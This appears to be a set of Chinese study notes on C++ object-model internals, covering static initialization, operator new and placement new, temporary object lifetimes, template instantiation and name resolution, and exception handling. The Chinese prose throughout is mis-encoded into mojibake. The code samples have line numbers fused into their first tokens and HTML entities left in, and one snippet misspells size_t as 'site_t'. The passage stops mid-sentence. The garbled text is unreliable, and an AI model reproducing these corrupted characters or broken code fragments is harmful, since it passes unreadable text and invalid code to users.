ä¸è¦å°†ææ„å‡½æ•°è®¾è®¡ä¸ºçº¯è™šçš„ï¼Œè¿™ä¸æ˜¯ä¸€ä¸ªå¥½çš„è®¾è®¡ã€‚å°†ææ„å‡½æ•°è®¾è®¡ä¸ºçº¯è™šå‡½æ•°æ„å‘³ç€ï¼Œå³ä½¿çº¯è™šå‡½æ•°åœ¨è¯­æ³•ä¸Šå…è®¸æˆ‘ä»¬åªå£°æ˜è€Œä¸å®šä¹‰çº¯è™šå‡½æ•°ï¼Œä½†è¿˜æ˜¯å¿…é¡»å®ç°è¯¥çº¯è™šææ„å‡½æ•°ï¼Œå¦åˆ™å®ƒæ‰€æœ‰çš„ç»§æ‰¿ç±»éƒ½å°†é‡åˆ°é“¾æ¥é”™è¯¯ã€‚ çœŸçš„å¿…è¦çš„æ—¶å€™æ‰ä½¿ç”¨è™šå‡½æ•°ï¼Œä¸è¦æ»¥ç”¨è™šå‡½æ•°ã€‚è™šå‡½æ•°æ„å‘³ç€ä¸å°çš„æˆæœ¬ï¼Œç¼–è¯‘å¾ˆå¯èƒ½ç»™ä½ çš„ç±»å¸¦æ¥è†¨èƒ€æ•ˆåº”ã€‚ ä¸èƒ½å†³å®šä¸€ä¸ªè™šå‡½æ•°æ˜¯å¦éœ€è¦ const ï¼Œé‚£ä¹ˆå°±ä¸è¦å®ƒã€‚ å†³ä¸åœ¨æ„é€ å‡½æ•°æˆ–ææ„å‡½æ•°ä¸­ä½¿ç”¨è™šå‡½æ•°æœºåˆ¶ã€‚åœ¨æ„é€ å‡½æ•°ä¸­ï¼Œæ¯æ¬¡è°ƒç”¨è™šå‡½æ•°ä¼šè¢«å†³è®®ä¸ºå½“å‰æ„é€ å‡½æ•°æ‰€å¯¹åº”ç±»çš„è™šå‡½æ•°å®ä½“ï¼Œè™šå‡½æ•°æœºåˆ¶å¹¶ä¸èµ·ä½œç”¨ã€‚ å…­ã€æ‰§è¡ŒæœŸè¯­æ„å­¦ï¼ˆRuntime Semanticsï¼‰ C++çš„ä¸€ä»¶å›°éš¾äº‹æƒ…ï¼šä¸å¤ªå®¹æ˜“ä»ç¨‹åºæºç çœ‹å‡ºè¡¨è¾¾å¼çš„å¤æ‚åº¦ã€‚ ä¸€èˆ¬è€Œè¨€æˆ‘ä»¬ä¼šæŠŠobjectå°½å¯èƒ½æ”¾ç½®åœ¨ä½¿ç”¨å®ƒçš„é‚£ä¸ªç¨‹åºåŒºæ®µé™„è¿‘ï¼Œè¿™ä¹ˆåšå¯ä»¥èŠ‚çœéå¿…è¦çš„å¯¹è±¡äº§ç”Ÿæ“ä½œå’Œæ‘§æ¯æ“ä½œã€‚ 6.1 å¯¹è±¡çš„æ„é€ å’Œææ„ å…¨å±€å¯¹è±¡ï¼ˆGlobal Objectsï¼‰ ç”±äºè¿™æ ·çš„é™åˆ¶ï¼Œä¸‹é¢è¿™äº›munchç­–ç•¥å°±æµ®ç°å‡ºæ¥äº†ï¼š ä¸ºæ¯ä¸€ä¸ªéœ€è¦é™æ€åˆå§‹åŒ–çš„æ–‡ä»¶äº§ç”Ÿä¸€ä¸ª_sti()å‡½æ•°ï¼Œå†…å«å¿…è¦çš„constructorè°ƒç”¨æ“ä½œæˆ–inline expansionsã€‚ åœ¨æ¯ä¸€ä¸ªéœ€è¦é™æ€çš„å†…å­˜é‡Šæ”¾æ“ä½œï¼ˆstatic deallocationï¼‰çš„æ–‡ä»¶ä¸­ï¼Œäº§ç”Ÿä¸€ä¸ª__std()å‡½æ•°ï¼ˆè¯‘æ³¨ï¼šæˆ‘æƒ³stdå°±æ˜¯static deallocationçš„ç¼©å†™ï¼‰ï¼Œå†…å«å¿…è¦çš„destructorè°ƒç”¨æ“ä½œï¼Œæˆ–æ˜¯å…¶ inline expansionsã€‚ æä¾›ä¸€ç»„runtime libraryâ€œmunchâ€å‡½æ•°ï¼šä¸€ä¸ª_main()å‡½æ•°ï¼ˆç”¨ä»¥è°ƒç”¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„æ‰€æœ‰__sti()å‡½æ•°ï¼‰ï¼Œä»¥åŠä¸€ä¸ªexit()å‡½æ•°ï¼ˆä»¥ç±»ä¼¼æ–¹å¼è°ƒç”¨æ‰€æœ‰çš„__std()å‡½æ•°ï¼‰ã€‚ Lippmanå»ºè®®ï¼šæ ¹æœ¬å°±ä¸è¦ä½¿ç”¨é‚£äº›éœ€è¦é™æ€åˆå§‹åŒ–çš„å…¨å±€å¯¹è±¡ã€‚çœŸçš„éè¦ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼Œè€Œä¸”è¿™ä¸ªå¯¹è±¡è¿˜éœ€è¦é™æ€åˆå§‹åŒ–ï¼Ÿç”¨ä¸€ä¸ªå‡½æ•°å°è£…ä¸€ä¸ªé™æ€å±€éƒ¨å¯¹è±¡ï¼Œä¹Ÿæ˜¯ä¸€æ ·çš„æ•ˆæœã€‚ 6.2 newå’Œdeleteè¿ç®—ç¬¦ è¿ç®—ç¬¦new expressionè¿ç®—çš„ä½¿ç”¨ï¼Œçœ‹èµ·æ¥ä¼¼ä¹æ˜¯ä¸ªå•ä¸€è¿ç®—ã€‚int *p=new int (5)å®é™…ä¸ŠåŒ…å«ç€ä¸¤ä¸ªæ­¥éª¤ï¼š è°ƒç”¨ä¸€ä¸ªåˆé€‚çš„operator newå®ä½“åˆ†é…è¶³å¤Ÿçš„æœªç±»å‹åŒ–çš„å†…å­˜ã€‚ è°ƒç”¨åˆé€‚çš„æ„é€ å‡½æ•°åˆå§‹åŒ–è¿™å—å†…å­˜ï¼Œå½“ç„¶intæ²¡æœ‰æ„é€ å‡½æ•°ï¼Œä½†æ˜¯ä¼šè¿›è¡Œèµ‹å€¼æ“ä½œï¼š*p=5ã€‚ deleteå¯»æ‰¾æ•°ç»„ç»´åº¦ï¼Œå¯¹äºdeleteè¿ç®—ç¬¦çš„æ•ˆç‡å¸¦æ¥æå¤§çš„å†²å‡»ï¼Œæ‰€ä»¥æ‰å¯¼è‡´è¿™æ ·çš„å¦¥åï¼šåªæœ‰åœ¨ä¸­æ‹¬å·å‡ºç°æ—¶ï¼Œç¼–è¯‘å™¨æ‰å¯»æ‰¾æ•°ç»„çš„ç»´åº¦ï¼Œå¦åˆ™å®ƒä¾¿å‡è®¾åªæœ‰å•ç‹¬ä¸€ä¸ªobjectsè¦è¢«åˆ é™¤ã€‚å¦‚æœç¨‹åºå‘˜æ²¡æœ‰æä¾›å¿…é¡»çš„ä¸­æ‹¬å·ï¼Œé‚£ä¹ˆå°±åªæœ‰ç¬¬ä¸€ä¸ªå…ƒç´ ä¼šè¢«ææ„ã€‚å…¶ä»–çš„å…ƒç´ ä»ç„¶å­˜åœ¨â€”â€”è™½ç„¶å…¶ç›¸å…³çš„å†…å­˜å·²ç»è¢«è¦æ±‚å½’è¿˜äº†ã€‚ new expressionå’Œoperator new new expressionå’Œoperator newå®Œå…¨ä¸æ˜¯ä¸€å›äº‹ï¼Œä½†å…³ç³»ä¸æµ…â€”â€”operator new ä¸ºnew expressionåˆ†é…å†…å­˜ã€‚ä¸”ä¸èƒ½é‡å®šä¹‰newæˆ–delete expressionçš„è¡Œä¸ºã€‚ operator newå…¶å®ä¹Ÿæ˜¯å¯ä»¥ç›´æ¥åˆ©ç”¨çš„ï¼Œè­¬å¦‚å½“æˆ‘ä»¬åªæƒ³åˆ†é…å†…å­˜ï¼Œè€Œä¸æ„¿æ„è¿›è¡Œåˆå§‹åŒ–çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ç”¨operator new æ¥è¿›è¡Œã€‚ç”¨æ³•å¦‚ä¸‹ï¼š 1T* newelements = static_cast&lt;T*&gt;(operator new ( sizeof(T) ); æ ‡å‡†åº“é‡è½½æœ‰ä¸¤ä¸ªç‰ˆæœ¬çš„operator newï¼Œåˆ†åˆ«ä¸ºå•ä¸ªå¯¹è±¡å’Œæ•°ç»„å¯¹è±¡æœåŠ¡ï¼Œå•ä¸ªå¯¹è±¡ç‰ˆæœ¬çš„æä¾›ç»™åˆ†é…å•ä¸ªå¯¹è±¡new expressionè°ƒç”¨ï¼Œæ•°ç»„ç‰ˆçš„æä¾›ç»™åˆ†é…æ•°ç»„çš„ new expression è°ƒç”¨ï¼š 12void *operator new(size_t); // allocate an objectvoid *operator new[](size_t); // allocate an array æˆ‘ä»¬å¯ä»¥åˆ†åˆ«é‡è½½è¿™ä¸¤ä¸ªç‰ˆæœ¬ï¼Œæ¥å®šä¹‰æˆ‘ä»¬è‡ªå·±çš„åˆ†é…å•ä¸ªå¯¹è±¡æˆ–å¯¹è±¡æ•°ç»„çš„å†…å­˜æ–¹å¼ã€‚å½“æˆ‘ä»¬è‡ªå·±åœ¨é‡è½½operator newæ—¶ï¼Œä¸ä¸€å®šè¦å®Œå…¨æŒ‰ç…§ä¸Šé¢ä¸¤ä¸ªç‰ˆæœ¬çš„åŸå‹é‡è½½ï¼Œå”¯ä¸€çš„ä¸¤ä¸ªè¦æ±‚æ˜¯ï¼šè¿”å›ä¸€ä¸ªvoid*ç±»å‹å’Œç¬¬ä¸€ä¸ªå‚æ•°çš„ç±»å‹å¿…é¡»ä¸ºsize_tã€‚ åœ¨ç±»ä¸­é‡è½½çš„operator newå’Œoperator deleteæ˜¯éšå¼é™æ€çš„ï¼Œå› ä¸ºå‰è€…è¿è¡Œäºå¯¹è±¡æ„é€ ä¹‹å‰ï¼Œåè€…è¿è¡Œäºå¯¹è±¡ææ„ä¹‹åï¼Œæ‰€ä»¥ä»–ä»¬ä¸èƒ½ä¹Ÿä¸åº”è¯¥æ‹¥æœ‰ä¸€ä¸ªthisæŒ‡é’ˆæ¥å­˜å–æ•°æ®ã€‚ placement operator new placement operator newç”¨æ¥åœ¨æŒ‡å®šåœ°å€ä¸Šæ„é€ å¯¹è±¡ï¼Œè¦æ³¨æ„çš„æ˜¯ï¼Œå®ƒå¹¶ä¸åˆ†é…å†…å­˜ï¼Œä»…ä»…æ˜¯å¯¹æŒ‡å®šåœ°å€è°ƒç”¨æ„é€ å‡½æ•°ã€‚ point *pt = new(p) point3d; å®ƒæ˜¯operator newçš„ä¸€ä¸ªé‡è½½ç‰ˆæœ¬ã€‚å®ƒçš„å®ç°æ–¹å¼å¼‚å¸¸ç®€å•ï¼Œä¼ å›ä¸€ä¸ªæŒ‡é’ˆå³å¯ï¼š 123void* operator new(site_t,void *p)&#123; return p;&#125; çœ‹ä¸€ä»½ä»£ç ï¼š 12345678910111213141516struct Base &#123; int j; virtual void f(); &#125;;struct Derived : Base &#123; void f(); &#125;;void fooBar() &#123; Base b; b.f(); // Base::f() invoked b.~Base(); //ææ„æ‰äº†ï¼Œä½†æ˜¯å†…å­˜å¹¶æœªé‡Šæ”¾æ‰ new (&amp;b) Derived; b.f(); // which f() invoked? &#125; ä¸Šè¿°ä¸¤ä¸ªç±»çš„å¤§å°ç›¸åŒï¼Œå› æ­¤å°†Derivedå¯¹è±¡æ”¾åœ¨ Baseå¯¹è±¡ä¸­æ˜¯å®‰å…¨çš„ï¼Œä½†æ˜¯åœ¨æœ€åä¸€å¥ä»£ç ä¸­ b.f()è°ƒç”¨çš„æ˜¯å“ªä¸€ä¸ªç±»çš„f()ã€‚ç­”æ¡ˆæ˜¯Base::f() çš„ã€‚ è™½ç„¶æ­¤æ—¶bä¸­å­˜å‚¨çš„å®é™…ä¸Šæ˜¯ä¸€ä¸ªDerivedå¯¹è±¡ï¼Œä½†æ˜¯ï¼Œé€šè¿‡ä¸€ä¸ªå¯¹è±¡æ¥è°ƒç”¨è™šå‡½æ•°ï¼Œå°†è¢«é™æ€å†³è®®å‡ºæ¥ï¼Œè™šå‡½æ•°æœºåˆ¶ä¸ä¼šè¢«å¯ç”¨ã€‚ 6.3 ä¸´æ—¶æ€§å¯¹è±¡ï¼ˆTemporary Objectsï¼‰ ä½•æ—¶ç”Ÿæˆä¸´æ—¶å¯¹è±¡ ç¨‹åºç‰‡æ®µï¼š 12T a, b;T c = a + b; ç¼–è¯‘å™¨æ›´æ„¿æ„ç›´æ¥è°ƒç”¨æ‹·è´æ„é€ å‡½æ•°çš„æ–¹å¼å°†a+bçš„å€¼æ”¾åˆ°cä¸­ï¼Œè¿™æ ·å°±ä¸éœ€è¦ä¸´æ—¶å¯¹è±¡ï¼Œå’Œå®ƒçš„æ„é€ å‡½æ•°å’Œæ‹·è´æ„é€ å‡½æ•°çš„è°ƒç”¨äº†ã€‚å¦‚æœoperator +çš„å®šä¹‰ç¬¦åˆNRVä¼˜åŒ–çš„æ¡ä»¶ï¼Œé‚£ä¹ˆNRVä¼˜åŒ–çš„å¼€å¯ï¼Œå°†ä½¿å¾—æ‹·è´æ„é€ å‡½æ•°çš„è°ƒç”¨å’Œnamed objectçš„ææ„å‡½æ•°éƒ½å…äº†ã€‚ æ‰€ä»¥æ¯”å…ˆå£°æ˜ c å¯¹è±¡ï¼Œå†è¿›è¡Œc = a + bè¦é«˜æ•ˆã€‚ ä¸´æ—¶å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸ ä¸´æ—¶æ€§å¯¹è±¡åœ¨å®Œæ•´è¡¨è¾¾å¼å°šæœªè¯„ä¼°å®Œå…¨ä¹‹å‰ï¼Œä¸å¾—è¢«æ‘§æ¯ã€‚ä¸´æ—¶æ€§å¯¹è±¡çš„æ‘§æ¯åº”å½“ä½œä¸ºé€ æˆäº§ç”Ÿè¿™ä¸ªä¸´æ—¶å¯¹è±¡çš„å®Œæ•´è¡¨è¾¾å¼çš„æœ€åä¸€ä¸ªæ­¥éª¤ã€‚ å¯¹äºä¸‹é¢çš„ç¨‹åºï¼š 12string s1(\"hello \"), s2(\"world \"), s3(\"by Adoo\");std::cout &lt;&lt; s1 + s2 + s3 &lt;&lt; std::endl; æ˜¾ç„¶ä¿å­˜s1+s2ç»“æœçš„ä¸´æ—¶å¯¹è±¡ï¼Œå¦‚æœåœ¨ä¸s3è¿›è¡ŒåŠ æ³•ä¹‹å‰ææ„ï¼Œå°†ä¼šå¸¦æ¥å¤§éº»çƒ¦ã€‚ ä¸ƒã€ç«™åœ¨å¯¹è±¡æ¨¡å‹çš„å°–ç«¯ C++è¯­è¨€ä¸‰ä¸ªè‘—åçš„æ‰©å……æ€§è´¨ï¼Œå®ƒä»¬éƒ½ä¼šå½±å“C++å¯¹è±¡ã€‚å®ƒä»¬åˆ†åˆ«æ˜¯templateã€exception handlingï¼ˆEHï¼‰å’Œruntime type identificationï¼ˆRTTIï¼‰ã€‚ 7.1 Template æœ‰å…³templateçš„ä¸‰ä¸ªä¸»è¦è®¨è®ºæ–¹å‘ï¼š templateçš„å£°æ˜ã€‚åŸºæœ¬æ¥è¯´å°±æ˜¯å½“ä½ å£°æ˜ä¸€ä¸ªtemplate classã€template class member functionç­‰ç­‰æ—¶ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆäº‹æƒ…ã€‚ å¦‚ä½•â€œå®ä¾‹åŒ–ï¼ˆinstantiatesï¼‰â€class objectã€inline nonmemberä»¥åŠ member template functionsã€‚è¿™äº›æ˜¯â€œæ¯ä¸€ä¸ªç¼–è¯‘å•ä½éƒ½ä¼šæ‹¥æœ‰ä¸€ä»½å®ä¾‹â€çš„ä¸œè¥¿ã€‚ å¦‚ä½•â€œå®ä¾‹åŒ–ï¼ˆinstantiatesï¼‰â€nonmemberã€member template functionsä»¥åŠstatic template class membersã€‚è¿™äº›éƒ½æ˜¯â€œæ¯ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ä¸­åªéœ€è¦ä¸€ä»½å®ä¾‹â€çš„ä¸œè¥¿ã€‚è¿™ä¹Ÿå°±æ˜¯ä¸€èˆ¬è€Œè¨€ templateæ‰€å¸¦æ¥çš„é—®é¢˜ã€‚ Templateçš„â€œå®ä¾‹åŒ–â€è¡Œä¸ºï¼ˆTemplate Instantiationï¼‰ ä¸€ä¸ªæ¨¡æ¿åªæœ‰è¢«ä½¿ç”¨åˆ°ï¼Œæ‰ä¼šè¢«å®ä¾‹åŒ–ï¼Œå¦åˆ™ä¸ä¼šè¢«å®ä¾‹åŒ–ã€‚å¯¹äºä¸€ä¸ªå®ä¾‹åŒ–åçš„æ¨¡æ¿æ¥è¯´ï¼Œæœªè¢«è°ƒç”¨çš„æˆå‘˜å‡½æ•°å°†ä¸ä¼šè¢«å®ä¾‹åŒ–ï¼Œåªæœ‰æˆå‘˜å‡½æ•°è¢«ä½¿ç”¨æ—¶ï¼ŒC++æ ‡å‡†æ‰è¦æ±‚å®ä¾‹åŒ–ä»–ä»¬ã€‚å…¶åŸå› ï¼Œæœ‰ä¸¤ç‚¹ï¼š ç©ºé—´å’Œæ—¶é—´æ•ˆç‡çš„è€ƒè™‘ï¼Œå¦‚æœæ¨¡æ¿ç±»ä¸­æœ‰100ä¸ªæˆå‘˜å‡½æ•°ï¼Œå¯¹æŸä¸ªç‰¹å®šç±»å‹åªæœ‰2ä¸ªå‡½æ•°ä¼šè¢«ä½¿ç”¨ï¼Œé’ˆå¯¹å¦ä¸€ä¸ªç‰¹å®šç±»å‹åªä¼šä½¿ç”¨3ä¸ªï¼Œé‚£ä¹ˆå¦‚æœå°†å‰©ä½™çš„195ä¸ªå‡½æ•°å®ä¾‹åŒ–å°†æµªè´¹å¤§é‡çš„æ—¶é—´å’Œç©ºé—´ã€‚ ä½¿æ¨¡æ¿æœ‰æœ€å¤§çš„é€‚ç”¨æ€§ã€‚å¹¶ä¸æ˜¯å®ä¾‹åŒ–å‡ºæ¥çš„æ¯ä¸ªç±»å‹éƒ½æ”¯æŒæ‰€æœ‰æ¨¡æ¿çš„å…¨éƒ¨æˆå‘˜å‡½æ•°æ‰€éœ€è¦çš„è¿ç®—ç¬¦ã€‚å¦‚æœåªå®ä¾‹åŒ–é‚£äº›çœŸæ­£è¢«ä½¿ç”¨çš„æˆå‘˜å‡½æ•°çš„è¯ï¼Œé‚£ä¹ˆåŸæœ¬åœ¨ç¼–è¯‘æœŸæœ‰é”™è¯¯çš„ç±»å‹ä¹Ÿèƒ½å¤Ÿå¾—åˆ°æ”¯æŒã€‚ å¯ä»¥æ˜ç¡®çš„è¦æ±‚åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­å°†æ•´ä¸ªç±»æ¨¡æ¿å®ä¾‹åŒ–ï¼š 1template class Point3d&lt;float&gt;; ä¹Ÿå¯ä»¥æ˜¾ç¤ºæŒ‡å®šå®ä¾‹åŒ–ä¸€ä¸ªæ¨¡æ¿ç±»çš„æˆå‘˜å‡½æ•°ï¼š 1template float Point3d&lt;float&gt;::X() const; æˆ–æ˜¯é’ˆå¯¹ä¸€ä¸ªæ¨¡æ¿å‡½æ•°ï¼š 12template Point3d&lt;float&gt; operator+( const Point3d&lt;float&gt;&amp;, const Point3d&lt;float&gt;&amp; ); Templateçš„é”™è¯¯æŠ¥å‘Šï¼ˆError Reporting within a Templateï¼‰ æ‰€ä»¥åœ¨ä¸€ä¸ªparsingç­–ç•¥ä¹‹ä¸‹ï¼Œæ‰€æœ‰è¯­æ±‡ï¼ˆlexingï¼‰é”™è¯¯å’Œè§£æï¼ˆparsingï¼‰é”™è¯¯éƒ½ä¼šåœ¨å¤„ç†templateå£°æ˜çš„è¿‡ç¨‹ä¸­è¢«æ ‡ç¤ºå‡ºæ¥ã€‚æ‰€æœ‰ä¸ç±»å‹æœ‰å…³çš„æ£€éªŒï¼Œå¦‚æœç‰µæ¶‰åˆ°templateå‚æ•°ï¼Œéƒ½å¿…é¡»å»¶è¿Ÿåˆ°çœŸæ­£çš„å®ä¾‹åŒ–æ“ä½œï¼ˆinstantiationï¼‰å‘ç”Ÿï¼Œæ‰å¾—ä¸ºä¹‹ã€‚ ç›®å‰çš„ç¼–è¯‘å™¨ï¼Œé¢å¯¹ä¸€ä¸ªtemplateå£°æ˜ï¼Œåœ¨å®ƒè¢«ä¸€ç»„å®é™…å‚æ•°å®ä¾‹åŒ–ä¹‹å‰ï¼Œåªèƒ½æ–½è¡Œä»¥æœ‰é™çš„é”™è¯¯æ£€æŸ¥ã€‚templateä¸­é‚£äº›ä¸è¯­æ³•æ— å…³çš„é”™è¯¯ï¼Œç¨‹åºå‘˜å¯èƒ½è®¤ä¸ºååˆ†æ˜æ˜¾ï¼Œç¼–è¯‘å™¨å´è®©å®ƒé€šè¿‡äº†ï¼Œåªæœ‰åœ¨ç‰¹å®šå®ä¾‹è¢«å®šä¹‰ä¹‹åï¼Œæ‰ä¼šå‘å‡ºæŠ±æ€¨ã€‚è¿™æ˜¯ç›®å‰å®ç°æŠ€æœ¯ä¸Šçš„ä¸€ä¸ªå¤§é—®é¢˜ã€‚ æ¨¡æ¿çš„é”™è¯¯æŠ¥å‘Šï¼Œä½¿ç”¨æ¨¡æ¿å¹¶é‡åˆ°é”™è¯¯çš„å¤§æ¦‚éƒ½æ·±æœ‰ä½“ä¼šï¼Œé‚£å°±æ˜¯ä¸€ä¸ªç¾éš¾ã€‚ Templateä¸­çš„åç§°å†³è®®ï¼ˆName Resolution within a Templateï¼‰ Templateä¹‹ä¸­ï¼Œå¯¹äºä¸€ä¸ªnonmember name çš„å†³è®®ç»“æœï¼Œæ˜¯æ ¹æ®è¿™ä¸ªnameçš„ä½¿ç”¨æ˜¯å¦ä¸â€œç”¨ä»¥å®ä¾‹åŒ–è¯¥templateçš„å‚æ•°ç±»å‹â€æœ‰å…³è€Œå†³å®šçš„ã€‚å¦‚æœå…¶ä½¿ç”¨äº’ä¸ç›¸å…³ï¼Œé‚£ä¹ˆå°±ä»¥â€œscope of the template declarationâ€æ¥å†³å®šnameã€‚å¦‚æœå…¶ä½¿ç”¨äº’æœ‰å…³è”ï¼Œé‚£ä¹ˆå°±ä»¥â€œscope of the tem plate instantiationâ€æ¥å†³å®šnameã€‚ è¿™æ„å‘³ç€ä¸€ä¸ªç¼–è¯‘å™¨å¿…é¡»ä¿æŒä¸¤ä¸ªscope contextsï¼š â€œscope of the template declarationâ€ï¼Œç”¨ä»¥ä¸“æ³¨äºä¸€èˆ¬çš„template classã€‚ â€œscope of the template instantiationâ€ï¼Œç”¨ä»¥ä¸“æ³¨äºç‰¹å®šçš„å®ä¾‹ã€‚ ç¼–è¯‘å™¨çš„å†³è®®ï¼ˆresolutionï¼‰ç®—æ³•å¿…é¡»å†³å®šå“ªä¸€ä¸ªæ‰æ˜¯é€‚å½“çš„scopeï¼Œç„¶ååœ¨å…¶ä¸­æœå¯»é€‚å½“çš„nameã€‚ ç¬¬ä¸€ç§æƒ…å†µï¼š 12345678910111213141516171819// scope of the template declarationextern double foo ( double ); template &lt; class type &gt; class ScopeRules &#123; public: void invariant() &#123; _member = foo( _val ); &#125; type type_dependent() &#123; return foo( _member ); &#125; // ... private: int _val; type _member; &#125;; ç¬¬äºŒç§æƒ…å†µ: 1234567//scope of the template instantiation extern int foo( int ); // ... ScopeRules&lt; int &gt; sr0; sr0.invariant();sr0.type_dependent(); åœ¨â€œscope of the template instantiation â€ä¸­ä¸¤ä¸ªfoo()éƒ½å£°æ˜åœ¨æ­¤ scopeä¸­ã€‚sr0.invariant() ä¸­è°ƒç”¨çš„æ˜¯ï¼š 1extern double foo ( double ); çœ‹ä¸Šå»ï¼Œåº”è¯¥è°ƒç”¨ï¼š 1extern int foo( int ); æ¯•ç«Ÿï¼Œ_val çš„ç±»å‹æ˜¯ int ç±»å‹ï¼Œå®ƒä»¬æ‰å®Œå…¨åŒ¹é…ã€‚ è€Œ sr0.type_dependent() ä¸­è°ƒç”¨çš„å´åœ¨æˆ‘ä»¬æ„æ–™ä¹‹ä¸­ï¼Œè°ƒç”¨çš„æ˜¯: 1extern int foo( int ); è¯¸ä¸Šæ‰€è¿°ï¼Œçœ‹ä¸Šå»æˆ–åˆç†æˆ–ä¸åˆç†çš„é€‰æ‹©ï¼ŒåŸå› åœ¨äº: template ä¹‹ä¸­ï¼Œ å¯¹äºä¸€ä¸ªéæˆå‘˜åå­—çš„å†³è®®ç»“æœæ˜¯æ ¹æ®è¿™ä¸ª name çš„ä½¿ç”¨æ˜¯å¦ä¸â€œç”¨ä»¥å®ä¾‹åŒ–è¯¥æ¨¡æ¿çš„å‚æ•°ç±»å‹â€æœ‰å…³æ¥å†³å®šnameã€‚å¦‚æœå…¶ä½¿ç”¨äº’ä¸ç›¸å¹²ï¼Œé‚£ä¹ˆå°±ä»¥â€œscope of the template declarationâ€æ¥å†³å®šnameã€‚å¦‚æœå…¶ä½¿ç”¨çš„äº’ç›¸å…³è”ï¼Œé‚£ä¹ˆå°±ä»¥â€œscope of the template instantiationâ€æ¥å†³å®šnameã€‚ Member Functionçš„å®ä¾‹åŒ–è¡Œä¸ºï¼ˆMember Function Instantiationï¼‰ å¯¹äº template çš„æ”¯æŒï¼Œæœ€å›°éš¾çš„è«è¿‡äºtemplate functionçš„å®ä¾‹åŒ–ï¼ˆinstantiationï¼‰ã€‚ç›®å‰çš„ç¼–è¯‘å™¨æä¾›äº†ä¸¤ä¸ªç­–ç•¥ï¼šä¸€ä¸ªæ˜¯ç¼–è¯‘æ—¶æœŸç­–ç•¥ï¼Œç¨‹åºä»£ç å¿…é¡»åœ¨program text fileä¸­å¤‡å¦¥å¯ç”¨ï¼›å¦ä¸€ä¸ªæ˜¯é“¾æ¥æ—¶æœŸç­–ç•¥ï¼Œæœ‰ä¸€äº›meta-compilationå·¥å…·å¯ä»¥å¯¼å¼•ç¼–è¯‘å™¨çš„å®ä¾‹åŒ–è¡Œä¸ºï¼ˆinstantiationï¼‰ã€‚ 7.2 å¼‚å¸¸å¤„ç†ï¼ˆException Handlingï¼‰ æ¬²æ”¯æŒexception handlingï¼Œç¼–è¯‘å™¨çš„ä¸»è¦å·¥ä½œå°±æ˜¯æ‰¾å‡ºcatchå­å¥ï¼Œä»¥å¤„ç†è¢«æŠ›å‡ºæ¥çš„ exceptionã€‚è¿™å¤šå°‘éœ€è¦è¿½è¸ªç¨‹åºå †æ ˆä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°çš„ç›®å‰ä½œç”¨åŒºåŸŸï¼ˆåŒ…æ‹¬è¿½è¸ªå‡½æ•°ä¸­local class objectså½“æ—¶çš„æƒ…å†µï¼‰ã€‚åŒæ—¶ï¼Œç¼–è¯‘å™¨å¿…é¡»æä¾›æŸç§æŸ¥è¯¢exception objects çš„æ–¹æ³•ï¼Œä»¥çŸ¥é“å…¶å®é™…ç±»å‹ï¼ˆè¿™ç›´æ¥å¯¼è‡´æŸç§å½¢å¼çš„æ‰§è¡ŒæœŸç±»å‹è¯†åˆ«ï¼Œä¹Ÿå°±æ˜¯ RTTIï¼‰ã€‚æœ€åï¼Œè¿˜éœ€è¦æŸç§æœºåˆ¶ç”¨ä»¥ç®¡ç†è¢«æŠ›å‡ºçš„objectï¼ŒåŒ…æ‹¬å®ƒçš„äº§ç”Ÿã€å­˜å‚¨ã€å¯èƒ½çš„ææ„ï¼ˆå¦‚æœæœ‰ç›¸å…³çš„destructorï¼‰ã€æ¸…ç†ï¼ˆclean upï¼‰ä»¥åŠä¸€èˆ¬å­˜å–ã€‚ä¹Ÿå¯èƒ½æœ‰ä¸€ä¸ªä»¥ä¸Šçš„objectsåŒæ—¶èµ·ä½œç”¨ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œexception handlingæœºåˆ¶éœ€è¦ä¸ç¼–è¯‘å™¨æ‰€äº§ç”Ÿçš„æ•°æ®ç»“æ„ä»¥åŠæ‰§è¡ŒæœŸçš„ä¸€ä¸ªexception libraryç´§å¯†åˆä½œã€‚ åœ¨ç¨‹åºå¤§å°å’Œæ‰§è¡Œé€Ÿåº¦ä¹‹é—´ï¼Œç¼–è¯‘å™¨å¿…é¡»æœ‰æ‰€æŠ‰æ‹©ï¼š ä¸ºäº†ç»´æŠ¤æ‰§è¡Œé€Ÿåº¦ï¼Œç¼–è¯‘å™¨å¯ä»¥åœ¨ç¼–è¯‘æ—¶æœŸå»ºç«‹èµ·ç”¨äºæ”¯æŒçš„æ•°æ®ç»“æ„ã€‚è¿™ä¼šä½¿ç¨‹åºçš„å¤§å°å‘ç”Ÿè†¨èƒ€ï¼Œä½†ç¼–è¯‘å™¨å¯ä»¥å‡ ä¹å¿½ç•¥è¿™äº›ç»“æ„ï¼Œç›´åˆ°æœ‰ä¸ªexceptionè¢«æŠ›å‡ºæ¥ã€‚ ä¸ºäº†ç»´æŠ¤ç¨‹åºå¤§å°ï¼Œç¼–è¯‘å™¨å¯ä»¥åœ¨æ‰§è¡ŒæœŸå»ºç«‹èµ·ç”¨äºæ”¯æŒçš„æ•°æ®ç»“æ„ã€‚è¿™ä¼šå½±å“ç¨‹åºçš„æ‰§è¡Œé€Ÿåº¦ï¼Œä½†æ„å‘³ç€ç¼–è¯‘å™¨åªæœ‰åœ¨å¿…è¦çš„æ—¶å€™æ‰å»ºç«‹é‚£äº›æ•°æ®ç»“æ„ï¼ˆå¹¶ä¸”å¯ä»¥æŠ›å¼ƒä¹‹ï¼‰ã€‚ Exception Handling å¿«é€Ÿæ£€é˜…C++çš„exception handlingç”±ä¸‰ä¸ªä¸»è¦çš„è¯­æ±‡ç»„ä»¶æ„æˆï¼š ä¸€ä¸ªthrowå­å¥ã€‚å®ƒåœ¨ç¨‹åºæŸå¤„å‘å‡ºä¸€ä¸ªexceptionã€‚è¢«æŠ›å‡ºå»çš„exceptionå¯ä»¥æ˜¯å†…å»ºç±»å‹ï¼Œä¹Ÿå¯ä»¥æ˜¯ä½¿ç”¨è€…è‡ªå®šç±»å‹ã€‚ ä¸€ä¸ªæˆ–å¤šä¸ªcatchå­å¥ã€‚æ¯ä¸€ä¸ªcatchå­å¥éƒ½æ˜¯ä¸€ä¸ªexception 